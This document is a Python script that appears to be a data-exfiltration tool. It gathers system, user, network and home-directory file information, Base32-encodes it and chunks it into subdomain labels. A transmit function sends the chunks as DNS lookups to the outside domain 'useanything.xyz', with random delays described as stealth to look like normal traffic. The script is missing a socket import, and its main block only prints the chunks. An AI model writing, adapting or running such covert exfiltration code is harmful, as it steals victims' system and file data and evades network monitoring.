import os
import platform
import subprocess
import base64
import math
import time
import random

def encode_to_base32(input_string):
    """
    Takes a standard string and returns its Base32 encoded version.
    """
    if not input_string:
        return ""

    # 1. Convert the string into bytes (UTF-8)
    byte_data = input_string.encode('utf-8')

    # 2. Perform the Base32 encoding
    b32_bytes = base64.b32encode(byte_data)

    # 3. Convert the resulting bytes back into a readable string
    return b32_bytes.decode('utf-8')

def get_system_snapshot_string():
    """
    Gathers system info and returns it as a single formatted string.
    """
    report = []
    report.append("=== SYSTEM AUDIT REPORT ===")
    
    # 1. OS and Hardware Information
    report.append(f"OS: {platform.system()}")
    report.append(f"Release: {platform.release()}")
    report.append(f"Version: {platform.version()}")
    report.append(f"Arch: {platform.machine()}")
    report.append("-" * 25)

    # 2. User Context
    user = os.getlogin() if os.name != 'nt' else os.environ.get('USERNAME')
    report.append(f"CURRENT USER: {user}")
    report.append("-" * 25)

    # 3. Network Configuration
    report.append("NETWORK CONFIGURATION:")
    try:
        # Use 'ipconfig' for Windows, 'ifconfig' or 'ip a' for Unix
        cmd = "ipconfig" if os.name == "nt" else "ip addr || ifconfig"
        net_info = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
        report.append(net_info.decode().strip())
    except Exception as e:
        report.append(f"Error retrieving network data: {e}")

    report.append("=== END OF REPORT ===")
    
    # Join everything into one large string
    return "\n".join(report)

def get_fs_inventory_raw_string(start_path="/", target_depth=4):
    """
    Traverses the filesystem and returns a plain text string 
    representation of the findings at target_depth.
    """
    report_lines = []
    
    # Standard exclusion list for performance
    SKIPPED_DIRS = {
        'Windows', 'Program Files', 'Program Files (x86)', '$Recycle.Bin', 
        'AppData', 'proc', 'dev', 'sys', 'run', 'lib', 'lib64', 'var/cache', 
        'tmp', '.git', 'node_modules', '__pycache__', '.cache'
    }

    start_path = os.path.abspath(start_path)
    base_depth = start_path.rstrip(os.path.sep).count(os.path.sep)

    try:
        for root, dirs, files in os.walk(start_path, topdown=True):
            # Prune skipped directories
            dirs[:] = [d for d in dirs if d not in SKIPPED_DIRS]
            
            # Calculate depth relative to start_path
            current_depth = root.rstrip(os.path.sep).count(os.path.sep) - base_depth

            if current_depth == target_depth:
                # Add the directory to the string
                report_lines.append(f"DIRECTORY: {root}")
                
                # Add files indented underneath
                if files:
                    for f in files:
                        report_lines.append(f"\tFILE: {f}")
                else:
                    report_lines.append("\t(No files found)")
                
                # Add a separator for readability
                report_lines.append("-" * 30)
                
                # Stop going deeper
                dirs.clear() 
            elif current_depth > target_depth:
                dirs.clear()

    except (PermissionError, OSError):
        pass

    # Join all lines into one single string separated by newlines
    return "\n".join(report_lines)

def prepare_dns_chunks(encoded_string, chunk_size=55):
    """
    Splits a long encoded string into a list of chunks.
    Each chunk is prepended with a sequence number for reassembly.
    """
    if not encoded_string:
        return []

    chunks = []
    
    # Calculate how many segments we will have
    # (Used to pad the sequence number, e.g., 01, 02... 99)
    total_segments = math.ceil(len(encoded_string) / chunk_size)
    padding = len(str(total_segments))

    for i in range(0, len(encoded_string), chunk_size):
        # Extract the slice
        segment = encoded_string[i : i + chunk_size]
        
        # Create a sequence ID (e.g., "001", "002")
        sequence_id = str(len(chunks) + 1).zfill(padding)
        
        # Combine: {ID}.{DATA}
        # We use a dot as a separator to create a sub-domain structure
        chunks.append(f"{sequence_id}.{segment}")

    return chunks

def transmit_dns_data(chunk_list, domain="useanything.xyz"):
    """
    Iterates through the chunk list and performs a DNS lookup for each.
    Includes a random delay to mimic natural traffic.
    """
    print(f"[*] Starting transmission of {len(chunk_list)} chunks to {domain}...")
    
    success_count = 0

    for chunk in chunk_list:
        # Construct the full hostname: {ID}.{DATA}.{DOMAIN}
        full_hostname = f"{chunk}.{domain}"
        
        try:
            # We use gethostbyname to trigger a standard A-record lookup
            # The system doesn't need to actually find an IP; the request 
            # hitting the target DNS server is what 'delivers' the data.
            socket.gethostbyname(full_hostname)
            success_count += 1
        except socket.gaierror:
            # This is expected! Since the subdomain doesn't actually exist,
            # the DNS system will return a 'Name not found' error.
            # The data was still 'sent' to the server in the request.
            success_count += 1
        except Exception as e:
            print(f"[!] Transmission error on chunk: {e}")

        # --- STEALTH: Jitter ---
        # Wait between 1 and 3 seconds so it doesn't look like a bot
        delay = random.uniform(1.0, 3.0)
        time.sleep(delay)

    print(f"\n[+] Transmission complete. {success_count}/{len(chunk_list)} chunks sent.")

# Example usage
if __name__ == "__main__":
    system_snapshot = get_system_snapshot_string()
    file_system = get_fs_inventory_raw_string(os.path.expanduser("~"), target_depth=3)
    print(prepare_dns_chunks(encode_to_base32(system_snapshot+"\n"+file_system)))
    